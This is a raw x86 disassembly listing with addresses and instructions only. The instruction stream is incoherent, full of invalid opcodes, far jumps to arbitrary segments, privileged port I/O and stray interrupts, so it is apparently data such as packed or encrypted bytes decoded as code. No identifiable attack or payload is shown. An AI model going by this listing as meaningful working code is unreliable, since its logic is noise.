  4047c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4047c7:	sbb    BYTE PTR [eax-0x69],bh
  4047ca:	cmp    edi,DWORD PTR [edx+0x55592ae1]
  4047d0:	pop    ss
  4047d1:	xor    al,0xd9
  4047d3:	xor    eax,0x13893db3
  4047d8:	jmp    0x8fdd:0x1e06f8a5
  4047df:	xor    al,0x3e
  4047e1:	jg     0x4047db
  4047e3:	mov    edx,0x11adc0f0
  4047e8:	jle    0x404809
  4047ea:	retf   
  4047eb:	pushf  
  4047ec:	aam    0x52
  4047ee:	imul   edi,DWORD PTR [ebx+0xc597bad],0x5eb24a80
  4047f8:	mov    ds:0x5b216bd2,eax
  4047fd:	(bad)  
  4047fe:	jg     0x404873
  404800:	lock jns 0x404787
  404803:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404804:	and    edx,DWORD PTR [eax+0x2cee85ae]
  40480a:	xchg   DWORD PTR [ebx],eax
  40480c:	stos   BYTE PTR es:[edi],al
  40480d:	test   al,0x8e
  40480f:	lods   eax,DWORD PTR ds:[esi]
  404810:	pop    ebp
  404811:	cld    
  404812:	int    0xf7
  404814:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404815:	xchg   BYTE PTR ds:0x2b4f955e,dl
  40481b:	adc    ch,BYTE PTR [esi-0x71]
  40481e:	sub    ebp,DWORD PTR [ecx+0x2684c36f]
  404824:	cmp    dl,BYTE PTR [edx]
  404826:	in     al,dx
  404827:	cmp    al,0x58
  404829:	lods   al,BYTE PTR ds:[esi]
  40482a:	push   edi
  40482b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40482c:	jge    0x404821
  40482e:	pusha  
  40482f:	mov    BYTE PTR [edi-0xe],ch
  404832:	inc    esi
  404833:	scas   eax,DWORD PTR es:[edi]
  404834:	mov    ah,0x1c
  404836:	daa    
  404837:	aad    0x5
  404839:	cli    
  40483a:	or     ah,ch
  40483c:	xchg   ecx,eax
  40483d:	xchg   esi,eax
  40483e:	int    0xe6
  404840:	lahf   
  404841:	(bad)  
  404842:	pop    edi
  404843:	mov    eax,0x512cf53c
  404848:	mov    eax,ds:0x56bced1
  40484d:	inc    edi
  40484e:	fwait
  40484f:	shr    BYTE PTR [ecx+esi*2+0x7],1
  404853:	and    eax,0xf5f3f46a
  404858:	mov    edi,0x27135bb7
  40485d:	outs   dx,BYTE PTR ds:[esi]
  40485e:	repnz sar edx,1
  404861:	dec    esi
  404862:	and    BYTE PTR [edx-0x54f14621],0x5d
  404869:	jbe    0x4048e6
  40486b:	(bad)  
  40486c:	stc    
  40486d:	adc    al,0x56
  40486f:	and    BYTE PTR [ebx-0xc749a9c],bl
  404875:	data16 adc ah,BYTE PTR [eax]
  404878:	mul    DWORD PTR [esi]
  40487a:	sub    eax,0xc9df319
  40487f:	jp     0x404807
  404881:	push   esi
  404882:	cwde   
  404883:	lahf   
  404884:	dec    ebp
  404885:	sub    BYTE PTR [ebp+0x1a],0xfb
  404889:	xchg   ecx,ecx
  40488b:	xor    ch,BYTE PTR [ebx]
  40488d:	xchg   ebx,eax
  40488e:	dec    ebx
  40488f:	push   ds
  404890:	pop    ebx
  404891:	(bad)  
  404892:	iret   
  404893:	cdq    
  404894:	cmp    dh,0x78
  404897:	ins    BYTE PTR es:[edi],dx
  404898:	mov    ebp,0xe8aacfdc
  40489d:	xchg   ebp,eax
  40489e:	add    bl,0xa0
  4048a1:	icebp  
  4048a2:	call   0x8716:0x48c34824
  4048a9:	jbe    0x404908
  4048ab:	lds    edi,FWORD PTR cs:[esi]
  4048ae:	and    al,0x4
  4048b0:	adc    eax,DWORD PTR [edi]
  4048b2:	dec    ecx
  4048b3:	aaa    
  4048b4:	add    edi,DWORD PTR [edi]
  4048b6:	push   esp
  4048b7:	sub    cl,cl
  4048b9:	fiadd  WORD PTR [ecx+ebx*4+0x1d]
  4048bd:	jmp    0x404864
  4048bf:	pop    esp
  4048c0:	ror    DWORD PTR [ebx-0x574e8f74],1
  4048c6:	or     al,0x5a
  4048c8:	mov    DWORD PTR [eiz*1-0x50ab235a],edx
  4048cf:	(bad)  
  4048d0:	fwait
  4048d1:	ins    DWORD PTR es:[edi],dx
  4048d2:	pushf  
  4048d3:	and    DWORD PTR [eax-0x23],edi
  4048d6:	xor    BYTE PTR [ebp+0x7b335443],ah
  4048dc:	pop    edi
  4048dd:	cmc    
  4048de:	push   edi
  4048df:	sub    edi,ecx
  4048e1:	sub    BYTE PTR [edi-0x17],bl
  4048e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4048e5:	pop    edi
  4048e6:	xor    edx,DWORD PTR ds:0x22a615f7
  4048ec:	pop    ebp
  4048ed:	nop
  4048ee:	xor    BYTE PTR [ebx-0x59],0xbb
  4048f2:	push   es
  4048f3:	xor    bh,al
  4048f5:	dec    ebp
  4048f6:	arpl   WORD PTR [esi-0x1e],bp
  4048f9:	pop    ebp
  4048fa:	sbb    al,0x3a
  4048fc:	sbb    al,0xb0
  4048fe:	inc    edx
  4048ff:	dec    ecx
  404900:	jb     0x404929
  404902:	cs stos BYTE PTR es:[edi],al
  404904:	(bad)
  404908:	ret    0xb432
  40490b:	cmp    al,bh
  40490d:	sub    al,BYTE PTR [ebx]
  40490f:	icebp  
  404910:	mov    cl,0x7d
  404912:	je     0x404941
  404914:	ror    DWORD PTR [esp+edi*4-0x224273bf],0xed
  40491c:	sub    BYTE PTR [edx-0x6],ah
  40491f:	inc    ecx
  404920:	dec    ebp
  404921:	xor    ch,BYTE PTR [ebp-0x78]
  404924:	cmp    BYTE PTR [edx-0x77529b6b],al
  40492a:	cwde   
  40492b:	and    al,0xe6
  40492d:	push   esp
  40492e:	popa   
  40492f:	scas   eax,DWORD PTR es:[edi]
  404930:	mov    bh,0xd3
  404932:	jecxz  0x4049ac
  404934:	addr16 jb 0x404943
  404937:	jnp    0x4048d5
  404939:	mov    ch,0xce
  40493b:	push   esp
  40493c:	pushf  
  40493d:	push   es
  40493e:	in     eax,0x49
  404940:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404941:	mov    al,0x75
  404943:	inc    ebx
  404944:	jno    0x404965
  404946:	sub    ebp,DWORD PTR [edi]
  404948:	int    0xbd
  40494a:	in     al,0xe
  40494c:	sbb    ebx,DWORD PTR [esi+edx*2]
  40494f:	mov    ch,0xe7
  404951:	xchg   esi,eax
  404952:	cmp    BYTE PTR [ecx-0x4ad7cfe8],0xbb
  404959:	lds    esp,FWORD PTR [ebp+ebp*8-0x3366f6da]
  404960:	shl    BYTE PTR [edi+0x8],cl
  404963:	imul   esi,DWORD PTR ss:[ebp-0x69],0x48573bd
  40496b:	cli    
  40496c:	mov    dh,0x13
  40496e:	cmp    DWORD PTR [ebx-0x1fc94e27],edx
  404974:	pop    ebp
  404975:	mov    ebx,0xa942b3de
  40497a:	loopne 0x40498e
  40497c:	das    
  40497d:	jp     0x404942
  40497f:	mov    WORD PTR [ebp-0x36],cs
  404982:	imul   esp,DWORD PTR [ebx],0x5da22eff
  404988:	arpl   WORD PTR [esi-0x69aab492],di
  40498e:	xchg   edx,eax
  40498f:	mov    al,ds:0x36a9e110
  404994:	sub    eax,0x119c5ed7
  404999:	out    dx,eax
  40499a:	pop    edx
  40499b:	adc    eax,0x2f4140e4
  4049a0:	dec    ebx
  4049a1:	(bad)  
  4049a2:	bound  edx,QWORD PTR [ebx+0x1f]
  4049a5:	sbb    eax,0xb2b27b11
  4049aa:	(bad)  
  4049ac:	leave  
  4049ad:	addr16 hlt 
  4049af:	pop    es
  4049b0:	jecxz  0x404a2a
  4049b2:	push   ebp
  4049b3:	mov    esi,0xbd7f00bf
  4049b8:	sbb    cl,BYTE PTR fs:[esp+edi*8]
  4049bc:	inc    ecx
  4049bd:	mov    ds:0x26fdb10e,al
  4049c2:	(bad)  
  4049c3:	mov    eax,ds:0x86b769f9
  4049c8:	mov    bh,0xc1
  4049ca:	xor    BYTE PTR [eax],0x40
  4049cd:	and    eax,0xdbd0431d
  4049d2:	jge    0x4049cf
  4049d4:	mov    eax,ds:0x102b32d9
  4049d9:	in     eax,0x69
  4049db:	sub    eax,0x46e3c89e
  4049e0:	sbb    edx,DWORD PTR [edx-0x4f]
  4049e3:	jge    0x4049f7
  4049e5:	push   edi
  4049e6:	pushf  
  4049e7:	push   es
  4049e8:	push   ebx
  4049e9:	fcom   DWORD PTR [ebx+0x5cb4e945]
  4049ef:	jbe    0x4049ae
  4049f1:	and    al,0x8b
  4049f3:	pop    ss
  4049f4:	dec    esi
  4049f5:	cli    
  4049f6:	inc    esi
  4049f7:	shr    bl,1
  4049f9:	cmp    ebx,edi
  4049fb:	xchg   ebx,eax
  4049fc:	mov    ch,0x76
  4049fe:	addr16 jne 0x40499e
  404a01:	inc    ebp
  404a02:	jb     0x404a3f
  404a04:	adc    DWORD PTR [ecx+0x73],ebp
  404a07:	call   0x4e80c6b5
  404a0c:	fucomi st,st(4)
  404a0e:	xchg   edx,eax
  404a0f:	pushf  
  404a10:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404a11:	fnstsw WORD PTR [eax]
  404a13:	pop    esp
  404a15:	fild   WORD PTR [edi+0x35]
  404a18:	mov    dl,0xcf
  404a1a:	sbb    BYTE PTR [edx+0x28],0x22
  404a1e:	fdiv   QWORD PTR [ecx-0x55]
  404a21:	int    0x9c
  404a23:	stc    
  404a24:	mov    dl,0xce
  404a26:	adc    esi,esp
  404a28:	sbb    ecx,DWORD PTR [ebx+0x6d]
  404a2b:	ret    0xb886
  404a2e:	popf   
  404a2f:	jne    0x404aae
  404a31:	cmp    ah,BYTE PTR [ecx]
  404a33:	loope  0x404a45
  404a35:	xchg   esi,ebx
  404a37:	add    esi,DWORD PTR [eax-0x73]
  404a3a:	jmp    0x3ecf:0x4012dd95
  404a41:	pop    edi
  404a42:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404a43:	icebp  
  404a44:	jle    0x4049eb
  404a46:	cmc    
  404a47:	cmp    ebp,DWORD PTR [edx+0xb3e27e0]
  404a4d:	stc    
  404a4e:	setp   ch
  404a51:	lock fcmovbe st,st(1)
  404a54:	cmp    eax,DWORD PTR [ecx-0x4db4d280]
  404a5a:	out    0x83,al
  404a5c:	xor    al,0xbb
  404a5e:	outs   dx,DWORD PTR ds:[esi]
  404a5f:	mov    ds:0x5532bb38,al
  404a64:	push   cs
  404a65:	push   esp
  404a66:	push   edx
  404a67:	dec    edx
  404a68:	imul   esp,DWORD PTR [edx-0xb],0xffffffc9
  404a6c:	in     eax,0x9d
  404a6e:	lahf   
  404a6f:	sbb    eax,0xf0a53840
  404a74:	adc    al,0x49
  404a76:	mov    edi,0xa6de60af
  404a7b:	sub    eax,0xeda82dfe
  404a80:	and    BYTE PTR [esi+edx*2],ch
  404a83:	pusha  
  404a84:	pusha  
  404a85:	or     eax,0x15d28c65
  404a8a:	fs xchg ecx,eax
  404a8c:	or     ebp,ebx
  404a8e:	push   edi
  404a8f:	and    dl,ch
  404a91:	call   DWORD PTR [esi+0x716005e7]
  404a97:	jnp    0x404ae5
  404a99:	pop    ss
  404a9a:	mov    ebp,0x68f64450
  404a9f:	mov    dh,0x4b
  404aa1:	shl    DWORD PTR [edi-0x35e621d0],1
  404aa7:	pop    edi
  404aa8:	mov    ah,BYTE PTR [edi]
  404aaa:	and    eax,0x629eb8ad
  404aaf:	shl    BYTE PTR ds:0x5756bd11,0x45
  404ab6:	or     eax,0x84415fc8
  404abb:	inc    esi
  404abc:	mov    edx,0x5431077d
  404ac1:	addr16 je 0x404b26
  404ac4:	sub    bh,BYTE PTR [edi+0x6f94fe4]
  404aca:	jmp    0x9cfd:0x33676376
  404ad1:	push   ebp
  404ad2:	fs dec esp
  404ad4:	repnz sbb eax,0xe0bcd004
  404ada:	es int3 
  404adc:	int    0x4e
  404ade:	sub    esp,DWORD PTR ds:0x9df9ba9
  404ae4:	xlat   BYTE PTR ds:[ebx]
  404ae5:	bnd jmp 0x404aac
  404ae8:	sbb    DWORD PTR [eiz*4-0x71aec383],edx
  404aef:	in     al,dx
  404af0:	pop    ds
  404af1:	in     al,0x54
  404af3:	in     eax,0x68
  404af5:	mov    ds:0xf1bc7127,al
  404afa:	jne    0x404af6
  404afc:	add    BYTE PTR [edi+edi*8],ah
  404aff:	xchg   DWORD PTR ds:0x23c2493e,ecx
  404b05:	(bad)  
  404b06:	fbld   TBYTE PTR [esi-0x40]
  404b09:	(bad)  
  404b0a:	mov    eax,ds:0x21c0f57e
  404b0f:	adc    eax,0x3f4c173c
  404b14:	dec    ebp
  404b15:	out    0xe,al
  404b17:	dec    edx
  404b18:	clc    
  404b19:	jb     0x404b51
  404b1b:	sbb    ebx,DWORD PTR [edi-0x6ccd389a]
  404b21:	(bad)  
  404b22:	xor    DWORD PTR [ecx+0xf],ecx
  404b25:	(bad)  
  404b26:	icebp  
  404b27:	mov    WORD PTR [eax-0x4485c779],?
  404b2d:	fdivp  st(4),st
  404b2f:	push   cs
  404b30:	jb     0x404b3e
  404b32:	ja     0x404b60
  404b34:	mov    BYTE PTR [edi],cl
  404b36:	mov    ah,0x7a
  404b38:	aaa    
  404b39:	cmp    ah,BYTE PTR [edi]
  404b3b:	push   cs
  404b3c:	jbe    0x404b98
  404b3e:	xor    esi,DWORD PTR [eax+esi*8+0x6b]
  404b42:	dec    edi
  404b43:	adc    al,0xf2
  404b45:	lods   al,BYTE PTR ds:[esi]
  404b46:	cmp    bl,al
  404b48:	ret    
  404b49:	sub    eax,0xbc9bfc06
  404b4e:	lds    edx,FWORD PTR [ebx+eax*2]
  404b51:	push   0x9833c857
  404b56:	and    ebp,DWORD PTR [ebx+0x5d]
  404b59:	xchg   ebp,eax
  404b5a:	imul   esp,DWORD PTR [ebx+eax*2-0x4c079adc],0xea2ea3f6
  404b65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404b66:	jo     0x404bc4
  404b68:	mov    cl,0x2c
  404b6a:	mov    bl,0x6a
  404b6c:	mov    ebx,0xbc76abf4
  404b71:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404b72:	jns    0x404bd2
  404b74:	sub    eax,0x4f4a3c5a
  404b79:	ds cmc 
  404b7b:	fs pop ds
  404b7d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404b7e:	push   edi
  404b7f:	test   ebp,edx
  404b81:	xchg   esp,eax
  404b82:	aas    
  404b83:	xchg   esp,eax
  404b84:	int    0x63
  404b86:	shl    bl,cl
  404b88:	in     eax,0x1b
  404b8a:	test   al,0xf6
  404b8c:	mov    ah,0x69
  404b8e:	rcr    DWORD PTR [ebx-0x1e],1
  404b91:	fwait
  404b92:	mul    BYTE PTR [ebp+ebx*4+0x220696b0]
  404b99:	ins    BYTE PTR es:[edi],dx
  404b9a:	sahf   
  404b9b:	add    BYTE PTR [edi-0x66],bh
  404b9e:	jno    0x404b92
  404ba0:	outs   dx,DWORD PTR ds:[esi]
  404ba1:	stos   DWORD PTR es:[edi],eax
  404ba2:	fwait
  404ba3:	jae    0x404bb9
  404ba5:	mov    cl,0xc9
  404ba7:	mov    ecx,0xe865de2
  404bac:	jl     0x404bb1
  404bae:	pop    ds
  404baf:	out    dx,al
  404bb0:	sar    DWORD PTR [ebx],0xad
  404bb3:	and    al,0xb5
  404bb5:	xchg   ecx,eax
  404bb6:	cld    
  404bb7:	mov    bh,ch
  404bb9:	sti    
  404bba:	jo     0x404c07
  404bbc:	dec    edi
  404bbd:	lods   eax,DWORD PTR ds:[esi]
  404bbe:	imul   esi,DWORD PTR [edi-0xd],0x4af73237
  404bc5:	fcomp  QWORD PTR [ecx-0x6b]
  404bc8:	inc    esi
  404bc9:	jmp    0x404be1
  404bcb:	inc    eax
  404bcc:	rol    dh,1
  404bce:	pop    ecx
  404bcf:	xchg   ebp,eax
  404bd0:	popf   
  404bd1:	xchg   esp,eax
  404bd2:	push   0xebb329aa
  404bd7:	daa    
  404bd8:	add    DWORD PTR [ecx-0x7198bedf],esp
  404bde:	mov    dh,0xa5
  404be0:	mov    al,ds:0x163f26ad
  404be5:	mov    ah,0x1b
  404be7:	xlat   BYTE PTR ds:[ebx]
  404be8:	jbe    0x404bef
  404bea:	xchg   edi,eax
  404beb:	stos   BYTE PTR es:[edi],al
  404bec:	pop    es
  404bed:	push   0x199db93e
  404bf2:	(bad)  
  404bf3:	in     eax,0x2c
  404bf5:	nop
  404bf6:	out    0x9b,al
  404bf8:	jle    0x404c03
  404bfa:	mov    bl,0xa5
  404bfc:	mov    cl,0xf1
  404bfe:	pop    edi
  404bff:	mov    ds:0xc6e4d75,eax
  404c05:	aam    0xdd
  404c07:	add    eax,0x5c0ff4b
  404c0c:	test   eax,0xee45c04a
  404c11:	gs sti 
  404c13:	(bad)  
  404c14:	mov    bl,0x33
  404c16:	loop   0x404c76
  404c18:	shr    DWORD PTR [esi+0x32],1
  404c1b:	and    BYTE PTR [edx+0x78],ah
  404c1e:	das    
  404c1f:	inc    ebx
  404c20:	pop    es
  404c21:	loopne 0x404bef
  404c23:	push   ds
  404c24:	push   ds
  404c25:	test   BYTE PTR ds:0xee5af38f,0xef
  404c2c:	push   es
  404c2d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404c2e:	mov    eax,ds:0x58879322
  404c33:	mov    edi,0x4af6227e
  404c38:	mov    ch,0x24
  404c3a:	add    ch,al
  404c3c:	mov    ds:0xf9d13618,eax
  404c41:	xchg   BYTE PTR [eax+0x47],ah
  404c44:	popf   
  404c45:	jb     0x404c7f
  404c47:	mov    bl,0x71
  404c49:	adc    ebp,ecx
  404c4b:	inc    eax
  404c4c:	push   esi
  404c4d:	mov    bh,ch
  404c4f:	nop
  404c50:	test   DWORD PTR [eax],0x71eebaa9
  404c56:	push   ebx
  404c57:	call   0x9d41de87
  404c5c:	sbb    BYTE PTR [eax+ecx*1+0x7f],ch
  404c60:	mov    ebp,0x4ed1e9a1
  404c65:	sub    BYTE PTR [ebx-0x57f2c346],0x2b
  404c6c:	or     BYTE PTR [edi+0x2],dl
  404c6f:	aad    0xcc
  404c71:	sub    dl,BYTE PTR [edx+0x566b2dbc]
  404c77:	cmp    dh,bh
  404c79:	retf   0x6a70
  404c7c:	inc    ecx
  404c7d:	mov    bl,BYTE PTR [esi]
  404c7f:	push   esp
  404c80:	leave  
  404c81:	inc    edi
  404c82:	test   al,0xad
  404c84:	ja     0x404c9c
  404c86:	or     eax,0xd51af90e
  404c8b:	mov    ah,0x52
  404c8d:	mov    al,BYTE PTR [esp+esi*4-0x2f]
  404c91:	cld    
  404c92:	retf   0x7cb
  404c95:	retf   
  404c96:	dec    esi
  404c97:	mov    esp,0xe5c15daf
  404c9c:	jge    0x404c74
  404c9e:	cmc    
  404c9f:	sar    DWORD PTR [ebp-0x6972777c],cl
  404ca5:	pop    esi
  404ca6:	xchg   ebp,eax
  404ca7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404ca8:	fbld   TBYTE PTR ds:0x1c68d22d
  404cae:	imul   esp,DWORD PTR [esi],0x3a8805e2
  404cb4:	pusha  
  404cb5:	cmp    al,0xb
  404cb7:	pop    esi
  404cb8:	add    ecx,ecx
  404cba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404cbb:	into   
  404cbc:	and    DWORD PTR [edx-0x4d73f73a],eax
  404cc2:	pop    edi
  404cc3:	push   0x3d
  404cc5:	popf   
  404cc6:	ror    DWORD PTR [edi],0x60
  404cc9:	push   cs
  404cca:	outs   dx,DWORD PTR ds:[esi]
  404ccb:	pop    ecx
  404ccc:	inc    ebx
  404ccd:	xor    esi,ecx
  404ccf:	inc    esp
  404cd0:	inc    edx
  404cd1:	ins    BYTE PTR es:[edi],dx
  404cd2:	push   edx
  404cd3:	out    dx,al
  404cd4:	imul   ebx,ebx,0xffffffaf
  404cd7:	dec    edx
  404cd8:	lods   al,BYTE PTR ds:[esi]
  404cd9:	sub    dh,BYTE PTR [esi+edi*1-0x700fbfd4]
  404ce0:	pop    ecx
  404ce1:	push   0x84c2a37d
  404ce6:	dec    ebp
  404ce7:	inc    BYTE PTR [ebx-0x5be43a5]
  404ced:	xchg   edx,eax
  404cee:	adc    eax,0xb987461c
  404cf3:	test   cl,dh
  404cf5:	jbe    0x404d47
  404cf7:	aas    
  404cf8:	mov    dh,0xbc
  404cfa:	mov    bh,0xfd
  404cfc:	cli    
  404cfd:	mov    bl,BYTE PTR [edi]
  404cff:	in     eax,dx
  404d00:	and    BYTE PTR [ebx-0x6ed818e8],ch
  404d06:	into   
  404d07:	mov    eax,ds:0xd5713b3a
  404d0c:	fs jne 0x404d82
  404d0f:	aam    0x6e
  404d11:	popf   
  404d12:	or     bh,BYTE PTR [ebp+0x43]
  404d15:	aaa    
  404d16:	sub    BYTE PTR [edi+eax*1-0x33],0x72
  404d1b:	xor    DWORD PTR [ecx+0x63bcbfbe],ecx
  404d21:	shr    esi,0x99
  404d24:	pushf  
  404d25:	adc    BYTE PTR [ebx-0x7b],dl
  404d28:	jmp    0x404d8d
  404d2a:	fsub   st,st(5)
  404d2c:	jmp    0x62b4049
  404d31:	and    al,0xf7
  404d33:	(bad)  
  404d34:	(bad)  
  404d36:	mov    eax,ds:0xa9fcdbee
  404d3b:	shl    BYTE PTR [ebp-0xb94afc4],cl
  404d41:	mov    WORD PTR es:[edi],?
  404d44:	test   eax,0x74f0049
  404d49:	and    DWORD PTR [eax],esp
  404d4b:	(bad)  
  404d4c:	mov    ecx,0xf9c97242
  404d51:	mov    al,0x38
  404d53:	pop    edi
  404d54:	sbb    al,0x2e
  404d56:	cmp    esi,esi
  404d58:	out    dx,eax
  404d59:	data16 aaa 
  404d5b:	pusha  
  404d5c:	stos   BYTE PTR es:[edi],al
  404d5d:	sbb    bh,BYTE PTR [ecx+0x3caed6d6]
  404d63:	push   cs
  404d64:	push   edx
  404d65:	xor    BYTE PTR [ebx+ebx*4+0x65],0x64
  404d6a:	fcom   DWORD PTR [ebx-0x4c]
  404d6d:	adc    al,0x2e
  404d6f:	mov    al,0xe8
  404d71:	push   es
  404d72:	inc    esp
  404d73:	in     eax,dx
  404d74:	and    eax,0xd919ae54
  404d79:	xor    al,0xc2
  404d7b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404d7c:	sub    eax,0x836759ed
  404d81:	mov    al,ds:0x181eced1
  404d86:	sbb    al,0x40
  404d88:	mov    dl,0xf6
  404d8a:	call   ebp
  404d8c:	test   eax,0xbe20e159
  404d91:	rcr    DWORD PTR es:[esp+esi*2],1
  404d95:	rcl    DWORD PTR [edi+0x29e2a42c],0xcb
  404d9c:	test   eax,0x281d31fe
  404da1:	mov    WORD PTR [esi],?
  404da3:	jl     0x404e21
  404da5:	daa    
  404da6:	xor    ecx,0xffffffe8
  404da9:	rcl    DWORD PTR [edi-0x19c7648f],0xd9
  404db0:	cs dec ecx
  404db2:	mov    ds:0x273dc99c,eax
  404db7:	mov    dh,BYTE PTR [ecx-0x26e2438e]
  404dbd:	pop    ss
  404dbe:	sub    eax,0xa0c18b47
  404dc3:	jle    0x404d74
  404dc5:	jns    0x404d58
  404dc7:	mov    dl,0x90
  404dc9:	cmp    eax,0x85a31cbf
  404dce:	mov    ah,0x98
  404dd0:	jg     0x404deb
  404dd2:	popf   
  404dd3:	sub    eax,0xa2bf6e4d
  404dd8:	enter  0x52bb,0x3d
  404ddc:	sahf   
  404ddd:	ins    BYTE PTR es:[edi],dx
  404dde:	rcl    BYTE PTR [ecx-0x4d28e2d1],0xd8
  404de5:	pop    ebx
  404de6:	sbb    cl,BYTE PTR [eax]
  404de8:	push   0x148e9f94
  404ded:	add    bp,WORD PTR [esi+eax*2+0x4b]
  404df2:	nop
  404df3:	mov    edi,0x6913331b
  404df8:	pop    ebp
  404df9:	repz out dx,al
  404dfb:	inc    eax
  404dfc:	add    eax,0xbc23bdc8
  404e01:	mov    edi,0x28acb32f
  404e06:	xchg   ecx,eax
  404e07:	mov    ah,0x78
  404e09:	test   DWORD PTR [edi-0x7a20e4a1],edi
  404e0f:	retf   
  404e10:	mov    eax,ds:0xf42cb132
  404e15:	stc    
  404e16:	add    al,0x40
  404e18:	sub    eax,0xc39fd35
  404e1d:	and    BYTE PTR [esp+edx*2+0xa],0x84
  404e22:	add    BYTE PTR [edi+0x620a5e9a],al
  404e28:	mov    edx,0xa3d98f66
  404e2d:	pop    ecx
  404e2e:	mov    ah,BYTE PTR [edi]
  404e30:	cld    
  404e31:	shl    ebx,cl
  404e33:	mov    ah,BYTE PTR [esi+eiz*1+0x195cbb6a]
  404e3a:	sbb    eax,0xc6fe67b0
  404e3f:	enter  0xe40a,0xa1
  404e43:	std    
  404e44:	call   0xea29:0xf6575aeb
  404e4b:	rol    DWORD PTR [ebp-0x564c11c6],cl
  404e51:	pusha  
  404e52:	aaa    
  404e53:	es ins BYTE PTR es:[edi],dx
  404e55:	call   0xa70b:0x7c353c3e
  404e5c:	pop    ebp
  404e5d:	jo     0x404ec4
  404e5f:	inc    edi
  404e60:	add    DWORD PTR [ebp+0x73],ebx
  404e63:	sbb    eax,0x6f460cd3
  404e68:	in     al,dx
  404e69:	fistp  DWORD PTR [esi-0x3f]
  404e6c:	mov    edx,0xe057c88d
  404e71:	pop    es
  404e72:	mov    WORD PTR [edx-0x3dc417fc],?
  404e78:	sbb    dl,BYTE PTR [edi+eiz*2-0x41]
  404e7c:	push   0xfffffffd
  404e7e:	xor    esp,DWORD PTR ds:[ebx]
  404e81:	mov    eax,0x54f5491e
  404e86:	add    dl,BYTE PTR [ebp+0x1e]
  404e89:	or     bl,BYTE PTR ss:[ecx+0x872f645]
  404e90:	adc    eax,0x183a6942
  404e95:	shr    BYTE PTR [ebx+eiz*1-0x32],1
  404e99:	inc    esi
  404e9a:	adc    eax,0x6c7ed9b
  404e9f:	mov    bh,0x5a
  404ea1:	and    eax,0xeeabd91
  404ea6:	rol    DWORD PTR [esi-0x21],1
  404ea9:	sbb    al,0x3
  404eab:	mul    ebx
  404ead:	or     cl,BYTE PTR [ecx+0x3f]
  404eb0:	rcr    DWORD PTR [ebx-0x30],0x42
  404eb4:	jo     0x404e9b
  404eb6:	js     0x404e5b
  404eb8:	add    ecx,DWORD PTR [ebp-0x549c183e]
  404ebe:	add    DWORD PTR [eax-0xf],ebp
  404ec1:	addr16 rol cl,1
  404ec4:	mov    dl,BYTE PTR [eax+0xa89e407]
  404eca:	(bad)  
  404ecb:	cmp    esp,DWORD PTR [ebx-0x17]
  404ece:	add    esi,DWORD PTR [ecx-0x2de88eba]
  404ed4:	aad    0x2a
  404ed6:	cwde   
  404ed7:	aam    0x79
  404ed9:	(bad)  
  404eda:	mov    al,ds:0xbe7ac9a1
  404edf:	mov    esp,0xf01182ec
  404ee4:	dec    eax
  404ee5:	adc    eax,0x7ddfa87
  404eea:	lgs    esp,FWORD PTR [edi+0x6b8746c]
  404ef1:	fmul   DWORD PTR [esi]
  404ef3:	xchg   edi,eax
  404ef4:	xchg   edx,eax
  404ef5:	add    ecx,DWORD PTR [edi-0x62]
  404ef8:	inc    eax
  404ef9:	sbb    al,BYTE PTR [edx]
  404efb:	mov    eax,0xd79a96
  404f00:	jecxz  0x404f51
  404f02:	xor    DWORD PTR [edi+edx*1+0x74],esi
  404f06:	or     BYTE PTR [ebx+0x76d783a3],bh
  404f0c:	xor    DWORD PTR [ecx+0x13],esi
  404f0f:	push   cs
  404f10:	out    0x22,al
  404f12:	loop   0x404f45
  404f14:	sub    BYTE PTR [eax+0x66],cl
  404f17:	xor    BYTE PTR [esi],bh
  404f19:	and    cl,BYTE PTR [edx+0x79]
  404f1c:	iret   
  404f1d:	push   0x5ad3f635
  404f22:	call   0xcdb4:0xb9679ab6
  404f29:	xlat   BYTE PTR ds:[ebx]
  404f2a:	dec    ebx
  404f2b:	sub    dl,BYTE PTR [ebx+0x13356268]
  404f31:	fist   WORD PTR [esi]
  404f33:	adc    edi,esi
  404f35:	imul   edx,ecx,0xfffffff3
  404f38:	addr16 xchg ebx,eax
  404f3a:	jno    0x404f31
  404f3c:	out    0xdb,eax
  404f3e:	test   eax,0x19a68465
  404f43:	mov    ch,0x65
  404f45:	ds leave 
  404f47:	es arpl sp,si
  404f4a:	push   cs
  404f4b:	in     al,0x1c
  404f4d:	in     eax,dx
  404f4e:	xchg   BYTE PTR [ebp-0x18],dl
  404f51:	mov    ebx,0x61a491d7
  404f56:	mov    ds:0xa3bf5151,al
  404f5b:	cmp    bh,dl
  404f5d:	fwait
  404f5e:	cmp    DWORD PTR [eax],edx
  404f60:	xor    DWORD PTR [edi+0x29319b28],ebp
  404f66:	jp     0x404f74
  404f68:	outs   dx,BYTE PTR ds:[esi]
  404f69:	pop    es
  404f6a:	mov    ebx,0xf48f4a6e
  404f6f:	xchg   ebx,eax
  404f70:	and    al,0xa4
  404f72:	mov    dl,0x8d
  404f74:	inc    edx
  404f75:	test   DWORD PTR [ebx],esp
  404f77:	jg     0x404f3a
  404f79:	adc    bl,bh
  404f7b:	int    0x3c
  404f7d:	mov    al,ds:0x1489a9e9
  404f82:	sub    al,0x2b
  404f84:	cmp    ch,BYTE PTR [edi-0x16]
  404f87:	pop    edi
  404f88:	push   eax
  404f89:	jmp    0x404f95
  404f8b:	push   es
  404f8c:	pop    ecx
  404f8d:	int3   
  404f8e:	sbb    dh,cl
  404f90:	push   ebx
  404f91:	xchg   esp,eax
  404f92:	jmp    0x404fe7
  404f94:	dec    ecx
  404f95:	ret    0x6b05
  404f98:	mov    BYTE PTR [eax+0x4570b719],ch
  404f9e:	sbb    al,0x53
  404fa0:	cmp    al,ch
  404fa2:	out    dx,eax
